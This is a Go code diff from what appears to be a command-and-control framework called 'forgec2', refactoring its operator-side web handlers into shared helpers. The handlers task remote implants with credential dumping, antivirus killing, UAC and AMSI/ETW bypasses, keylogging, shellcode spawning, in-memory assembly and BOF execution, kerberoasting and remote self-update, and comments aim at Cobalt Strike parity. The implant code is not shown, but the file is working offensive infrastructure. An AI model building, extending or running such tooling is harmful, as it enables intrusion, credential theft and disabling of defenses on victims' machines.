@@ -7,7 +7,6 @@ import (
 	"io"
 	"log/slog"
 	"net/http"
-	"time"
 
 	"github.com/forgec2/forgec2/internal/db"
 	"github.com/gin-gonic/gin"
@@ -15,17 +14,13 @@ import (
 
 func (s *Server) handleShellPage(c *gin.Context) {
 	id := c.Param("id")
-	var agent db.Agent
+	var agent db.Implant
 	if err := s.db.First(&agent, "id = ?", id).Error; err != nil {
 		c.String(http.StatusNotFound, "Agent not found")
 		return
 	}
 
-	if time.Since(agent.LastSeen) > s.offlineThreshold() {
-		agent.Status = "offline"
-	} else {
-		agent.Status = "online"
-	}
+	agent.Status = s.agentStatus(agent).Status
 
 	stats := s.getNavStats()
 	data := gin.H{
@@ -33,7 +28,6 @@ func (s *Server) handleShellPage(c *gin.Context) {
 		"ActiveNav": "agents",
 		"Agent":     agent,
 	}
-	s.addUserToData(c, data)
 	for k, v := range stats {
 		data[k] = v
 	}
@@ -107,21 +101,7 @@ func (s *Server) handleGetTaskStatus(c *gin.Context) {
 }
 
 func (s *Server) handleRequestPS(c *gin.Context) {
-	id := c.Param("id")
-
-	if _, ok := s.getAgentOrFail(c, id); !ok {
-		return
-	}
-
-	task, err := s.createTask(id, "ps", "", "", "", "", 0, 0)
-	if err != nil {
-		slog.Error("Failed to create task", "agent_id", id, "error", err)
-		c.JSON(http.StatusInternalServerError, gin.H{"error": "failed to create task"})
-		return
-	}
-
-	slog.Info("Process list requested", "agent", id)
-	s.dispatchTask(c, task, "request_ps", "process list")
+	s.createSimpleTask(c, c.Param("id"), simpleTaskDef{"ps", "request_ps", "process list"})
 }
 
 func (s *Server) handleSuspendProcess(c *gin.Context) {
@@ -179,17 +159,7 @@ func (s *Server) handleKillProcess(c *gin.Context) {
 }
 
 func (s *Server) handleClipboardGet(c *gin.Context) {
-	id := c.Param("id")
-	if _, ok := s.getAgentOrFail(c, id); !ok {
-		return
-	}
-	task, err := s.createTask(id, "clipboard_get", "", "", "", "", 0, 0)
-	if err != nil {
-		c.JSON(http.StatusInternalServerError, gin.H{"error": "failed to create task"})
-		return
-	}
-	slog.Info("Clipboard get requested", "agent", id)
-	s.dispatchTask(c, task, "clipboard_get", "")
+	s.createSimpleTask(c, c.Param("id"), simpleTaskDef{"clipboard_get", "clipboard_get", ""})
 }
 
 func (s *Server) handleClipboardSet(c *gin.Context) {
@@ -282,74 +252,23 @@ func (s *Server) handleRegDelete(c *gin.Context) {
 }
 
 func (s *Server) handleReboot(c *gin.Context) {
-	id := c.Param("id")
-	if _, ok := s.getAgentOrFail(c, id); !ok {
-		return
-	}
-	task, err := s.createTask(id, "reboot", "", "", "", "", 0, 0)
-	if err != nil {
-		c.JSON(http.StatusInternalServerError, gin.H{"error": "failed to create task"})
-		return
-	}
-	slog.Info("Reboot requested", "agent", id)
-	s.dispatchTask(c, task, "reboot", "")
+	s.createSimpleTask(c, c.Param("id"), simpleTaskDef{"reboot", "reboot", ""})
 }
 
 func (s *Server) handleShutdown(c *gin.Context) {
-	id := c.Param("id")
-	if _, ok := s.getAgentOrFail(c, id); !ok {
-		return
-	}
-	task, err := s.createTask(id, "shutdown", "", "", "", "", 0, 0)
-	if err != nil {
-		c.JSON(http.StatusInternalServerError, gin.H{"error": "failed to create task"})
-		return
-	}
-	slog.Info("Shutdown requested", "agent", id)
-	s.dispatchTask(c, task, "shutdown", "")
+	s.createSimpleTask(c, c.Param("id"), simpleTaskDef{"shutdown", "shutdown", ""})
 }
 
 func (s *Server) handleListDrives(c *gin.Context) {
-	id := c.Param("id")
-	if _, ok := s.getAgentOrFail(c, id); !ok {
-		return
-	}
-	task, err := s.createTask(id, "drives", "", "", "", "", 0, 0)
-	if err != nil {
-		c.JSON(http.StatusInternalServerError, gin.H{"error": "failed to create task"})
-		return
-	}
-	slog.Info("List drives requested", "agent", id)
-	s.dispatchTask(c, task, "list_drives", "")
+	s.createSimpleTask(c, c.Param("id"), simpleTaskDef{"drives", "list_drives", ""})
 }
 
 func (s *Server) handleBeaconNow(c *gin.Context) {
-	id := c.Param("id")
-	if _, ok := s.getAgentOrFail(c, id); !ok {
-		return
-	}
-	// Send a lightweight task to force immediate beacon
-	task, err := s.createTask(id, "beacon_now", "", "", "", "", 0, 0)
-	if err != nil {
-		c.JSON(http.StatusInternalServerError, gin.H{"error": "failed to create task"})
-		return
-	}
-	slog.Info("Force beacon requested", "agent", id)
-	s.dispatchTask(c, task, "beacon_now", "")
+	s.createSimpleTask(c, c.Param("id"), simpleTaskDef{"beacon_now", "beacon_now", ""})
 }
 
 func (s *Server) handleListServices(c *gin.Context) {
-	id := c.Param("id")
-	if _, ok := s.getAgentOrFail(c, id); !ok {
-		return
-	}
-	task, err := s.createTask(id, "services", "", "", "", "", 0, 0)
-	if err != nil {
-		c.JSON(http.StatusInternalServerError, gin.H{"error": "failed to create task"})
-		return
-	}
-	slog.Info("List services requested", "agent", id)
-	s.dispatchTask(c, task, "list_services", "")
+	s.createSimpleTask(c, c.Param("id"), simpleTaskDef{"services", "list_services", ""})
 }
 
 func (s *Server) handlePortScan(c *gin.Context) {
@@ -371,45 +290,15 @@ func (s *Server) handlePortScan(c *gin.Context) {
 }
 
 func (s *Server) handleNetstat(c *gin.Context) {
-	id := c.Param("id")
-	if _, ok := s.getAgentOrFail(c, id); !ok {
-		return
-	}
-	task, err := s.createTask(id, "netstat", "", "", "", "", 0, 0)
-	if err != nil {
-		c.JSON(http.StatusInternalServerError, gin.H{"error": "failed to create task"})
-		return
-	}
-	slog.Info("Netstat requested", "agent", id)
-	s.dispatchTask(c, task, "netstat", "")
+	s.createSimpleTask(c, c.Param("id"), simpleTaskDef{"netstat", "netstat", ""})
 }
 
 func (s *Server) handleUsers(c *gin.Context) {
-	id := c.Param("id")
-	if _, ok := s.getAgentOrFail(c, id); !ok {
-		return
-	}
-	task, err := s.createTask(id, "users", "", "", "", "", 0, 0)
-	if err != nil {
-		c.JSON(http.StatusInternalServerError, gin.H{"error": "failed to create task"})
-		return
-	}
-	slog.Info("Users requested", "agent", id)
-	s.dispatchTask(c, task, "users", "")
+	s.createSimpleTask(c, c.Param("id"), simpleTaskDef{"users", "users", ""})
 }
 
 func (s *Server) handleAV(c *gin.Context) {
-	id := c.Param("id")
-	if _, ok := s.getAgentOrFail(c, id); !ok {
-		return
-	}
-	task, err := s.createTask(id, "av", "", "", "", "", 0, 0)
-	if err != nil {
-		c.JSON(http.StatusInternalServerError, gin.H{"error": "failed to create task"})
-		return
-	}
-	slog.Info("AV detect requested", "agent", id)
-	s.dispatchTask(c, task, "av", "")
+	s.createSimpleTask(c, c.Param("id"), simpleTaskDef{"av", "av", ""})
 }
 
 func (s *Server) handleDownloadURL(c *gin.Context) {
@@ -432,17 +321,7 @@ func (s *Server) handleDownloadURL(c *gin.Context) {
 }
 
 func (s *Server) handleUninstall(c *gin.Context) {
-	id := c.Param("id")
-	if _, ok := s.getAgentOrFail(c, id); !ok {
-		return
-	}
-	task, err := s.createTask(id, "uninstall", "", "", "", "", 0, 0)
-	if err != nil {
-		c.JSON(http.StatusInternalServerError, gin.H{"error": "failed to create task"})
-		return
-	}
-	slog.Info("Uninstall requested", "agent", id)
-	s.dispatchTask(c, task, "uninstall", "")
+	s.createSimpleTask(c, c.Param("id"), simpleTaskDef{"uninstall", "uninstall", ""})
 }
 
 func (s *Server) handleSetSleep(c *gin.Context) {
@@ -505,17 +384,7 @@ func (s *Server) handleUACBypass(c *gin.Context) {
 }
 
 func (s *Server) handleKillAV(c *gin.Context) {
-	id := c.Param("id")
-	if _, ok := s.getAgentOrFail(c, id); !ok {
-		return
-	}
-	task, err := s.createTask(id, "kill_av", "", "", "", "", 0, 0)
-	if err != nil {
-		c.JSON(http.StatusInternalServerError, gin.H{"error": "failed to create task"})
-		return
-	}
-	slog.Info("Kill AV requested", "agent", id)
-	s.dispatchTask(c, task, "kill_av", "")
+	s.createSimpleTask(c, c.Param("id"), simpleTaskDef{"kill_av", "kill_av", ""})
 }
 
 // Keylogger handlers (high-value addition)
@@ -576,17 +445,7 @@ func (s *Server) handleDumpKeylogger(c *gin.Context) {
 // === High value CS parity: 1(SOCKS),3(creds),4(inject),6(lateral) ===
 
 func (s *Server) handleCredsDump(c *gin.Context) {
-	id := c.Param("id")
-	if _, ok := s.getAgentOrFail(c, id); !ok {
-		return
-	}
-	task, err := s.createTask(id, "creds", "", "", "", "", 0, 0)
-	if err != nil {
-		c.JSON(http.StatusInternalServerError, gin.H{"error": "failed to create task"})
-		return
-	}
-	slog.Info("Creds dump requested", "agent", id)
-	s.dispatchTask(c, task, "creds_dump", "")
+	s.createSimpleTask(c, c.Param("id"), simpleTaskDef{"creds", "creds_dump", ""})
 }
 
 func (s *Server) handleInject(c *gin.Context) {
@@ -624,27 +483,10 @@ func (s *Server) handleSpawn(c *gin.Context) {
 		return
 	}
 
-	file, err := c.FormFile("shellcode")
-	if err != nil {
-		c.JSON(http.StatusBadRequest, gin.H{"error": "shellcode file required"})
+	_, b64Data, size, ok := s.handleFileUpload(c, "shellcode")
+	if !ok {
 		return
 	}
-	if file.Size > MaxUploadSize {
-		c.JSON(http.StatusBadRequest, gin.H{"error": fmt.Sprintf("shellcode too large: %d bytes (max %d)", file.Size, MaxUploadSize)})
-		return
-	}
-	f, err := file.Open()
-	if err != nil {
-		c.JSON(http.StatusInternalServerError, gin.H{"error": "failed to read shellcode"})
-		return
-	}
-	defer f.Close()
-	data, err := io.ReadAll(f)
-	if err != nil {
-		c.JSON(http.StatusInternalServerError, gin.H{"error": "failed to read shellcode data"})
-		return
-	}
-	b64Data := base64.StdEncoding.EncodeToString(data)
 
 	cmd := target + "|" + technique + "|" + b64Data
 	task, err := s.createTask(id, "spawn", cmd, "", "", "", 0, 0)
@@ -652,8 +494,8 @@ func (s *Server) handleSpawn(c *gin.Context) {
 		c.JSON(http.StatusInternalServerError, gin.H{"error": "failed to create task"})
 		return
 	}
-	slog.Info("Spawn requested", "agent", id, "target", target, "tech", technique, "size", len(data))
-	s.LogAuditRecord(c, "spawn", "agent", id, fmt.Sprintf("Spawn: %s|%s (%d bytes shellcode)", target, technique, len(data)), true, nil)
+	slog.Info("Spawn requested", "agent", id, "target", target, "tech", technique, "size", size)
+	s.LogAuditRecord(c, "spawn", "agent", id, fmt.Sprintf("Spawn: %s|%s (%d bytes shellcode)", target, technique, size), true, nil)
 	s.dispatchTask(c, task, "spawn", fmt.Sprintf("%s|%s", target, technique))
 }
 
@@ -806,37 +648,19 @@ func (s *Server) handleExecuteAssembly(c *gin.Context) {
 		return
 	}
 
-	// Accept assembly file upload
-	file, err := c.FormFile("assembly")
-	if err != nil {
-		c.JSON(http.StatusBadRequest, gin.H{"error": "assembly file required"})
+	filename, b64Data, size, ok := s.handleFileUpload(c, "assembly")
+	if !ok {
 		return
 	}
-	if file.Size > MaxUploadSize {
-		c.JSON(http.StatusBadRequest, gin.H{"error": fmt.Sprintf("assembly too large: %d bytes (max %d)", file.Size, MaxUploadSize)})
-		return
-	}
-	f, err := file.Open()
-	if err != nil {
-		c.JSON(http.StatusInternalServerError, gin.H{"error": "failed to read assembly"})
-		return
-	}
-	defer f.Close()
-	data, err := io.ReadAll(f)
-	if err != nil {
-		c.JSON(http.StatusInternalServerError, gin.H{"error": "failed to read assembly data"})
-		return
-	}
-	b64Data := base64.StdEncoding.EncodeToString(data)
 
 	task, err := s.createTask(id, "execute_assembly", "", "", "", b64Data, 0, 0)
 	if err != nil {
 		c.JSON(http.StatusInternalServerError, gin.H{"error": "failed to create task"})
 		return
 	}
-	slog.Info("Execute-assembly requested", "agent", id, "assembly", file.Filename, "size", len(data))
-	s.LogAuditRecord(c, "execute_assembly", "agent", id, fmt.Sprintf("Assembly: %s (%d bytes)", file.Filename, len(data)), true, nil)
-	s.dispatchTask(c, task, "execute_assembly", file.Filename)
+	slog.Info("Execute-assembly requested", "agent", id, "assembly", filename, "size", size)
+	s.LogAuditRecord(c, "execute_assembly", "agent", id, fmt.Sprintf("Assembly: %s (%d bytes)", filename, size), true, nil)
+	s.dispatchTask(c, task, "execute_assembly", filename)
 }
 
 // ── kerberoast: Request TGS hashes for all SPNs ────────────────────────────
@@ -1030,37 +854,20 @@ func (s *Server) handleBOF(c *gin.Context) {
 		return
 	}
 
-	file, err := c.FormFile("bof")
-	if err != nil {
-		c.JSON(http.StatusBadRequest, gin.H{"error": "bof file (.o) required"})
-		return
-	}
-	if file.Size > MaxUploadSize {
-		c.JSON(http.StatusBadRequest, gin.H{"error": fmt.Sprintf("BOF too large: %d bytes (max %d)", file.Size, MaxUploadSize)})
-		return
-	}
-	f, err := file.Open()
-	if err != nil {
-		c.JSON(http.StatusInternalServerError, gin.H{"error": "failed to read BOF file"})
-		return
-	}
-	defer f.Close()
-	data, err := io.ReadAll(f)
-	if err != nil {
-		c.JSON(http.StatusInternalServerError, gin.H{"error": "failed to read BOF data"})
+	filename, b64Data, size, ok := s.handleFileUpload(c, "bof")
+	if !ok {
 		return
 	}
 	args := c.PostForm("args")
-	b64Data := base64.StdEncoding.EncodeToString(data)
 
 	task, err := s.createTask(id, "bof", args, "", "", b64Data, 0, 0)
 	if err != nil {
 		c.JSON(http.StatusInternalServerError, gin.H{"error": "failed to create task"})
 		return
 	}
-	slog.Info("BOF execution requested", "agent", id, "file", file.Filename, "size", len(data), "args", args)
-	s.LogAuditRecord(c, "bof", "agent", id, fmt.Sprintf("BOF: %s (%d bytes) args=%s", file.Filename, len(data), args), true, nil)
-	c.JSON(http.StatusOK, gin.H{"success": true, "task_id": task.ID, "message": fmt.Sprintf("BOF %s dispatched", file.Filename)})
+	slog.Info("BOF execution requested", "agent", id, "file", filename, "size", size, "args", args)
+	s.LogAuditRecord(c, "bof", "agent", id, fmt.Sprintf("BOF: %s (%d bytes) args=%s", filename, size, args), true, nil)
+	c.JSON(http.StatusOK, gin.H{"success": true, "task_id": task.ID, "message": fmt.Sprintf("BOF %s dispatched", filename)})
 }
 
 // ── AMSI/ETW Bypass ──────────────────────────────────────────────────────────
@@ -1118,4 +925,57 @@ func (s *Server) handleSelfUpdate(c *gin.Context) {
 	slog.Info("Self-update requested", "agent", id, "url", url)
 	s.LogAuditRecord(c, "self_update", "agent", id, "Self-update: "+url, true, nil)
 	s.dispatchTask(c, task, "self_update", "Self-Update ("+url+")")
+}
+
+// simpleTaskDef defines a basic task with no extra parameters
+type simpleTaskDef struct {
+	taskType string // e.g. "ps", "reboot"
+	audit    string // e.g. "request_ps", "reboot"
+	details  string // audit detail string
+}
+
+// createSimpleTask creates and dispatches a parameterless agent task
+func (s *Server) createSimpleTask(c *gin.Context, id string, def simpleTaskDef) bool {
+	if _, ok := s.getAgentOrFail(c, id); !ok {
+		return false
+	}
+	task, err := s.createTask(id, def.taskType, "", "", "", "", 0, 0)
+	if err != nil {
+		slog.Error("Failed to create task", "type", def.taskType, "agent_id", id, "error", err)
+		c.JSON(http.StatusInternalServerError, gin.H{"error": "failed to create task"})
+		return false
+	}
+	slog.Info(def.taskType+" requested", "agent", id)
+	s.dispatchTask(c, task, def.audit, def.details)
+	return true
+}
+
+// handleFileUpload reads an uploaded file from a form field and returns base64 content.
+// fieldName is the form field name (e.g. "shellcode", "assembly", "bof").
+func (s *Server) handleFileUpload(c *gin.Context, fieldName string) (filename, b64Data string, size int64, ok bool) {
+	file, err := c.FormFile(fieldName)
+	if err != nil {
+		c.JSON(http.StatusBadRequest, gin.H{"error": fieldName + " file required"})
+		return
+	}
+	if file.Size > MaxUploadSize {
+		c.JSON(http.StatusBadRequest, gin.H{"error": fmt.Sprintf("file too large: %d bytes (max %d)", file.Size, MaxUploadSize)})
+		return
+	}
+	f, err := file.Open()
+	if err != nil {
+		c.JSON(http.StatusInternalServerError, gin.H{"error": "failed to read " + fieldName})
+		return
+	}
+	defer f.Close()
+	data, err := io.ReadAll(f)
+	if err != nil {
+		c.JSON(http.StatusInternalServerError, gin.H{"error": "failed to read " + fieldName + " data"})
+		return
+	}
+	filename = file.Filename
+	size = int64(len(data))
+	b64Data = base64.StdEncoding.EncodeToString(data)
+	ok = true
+	return
 }
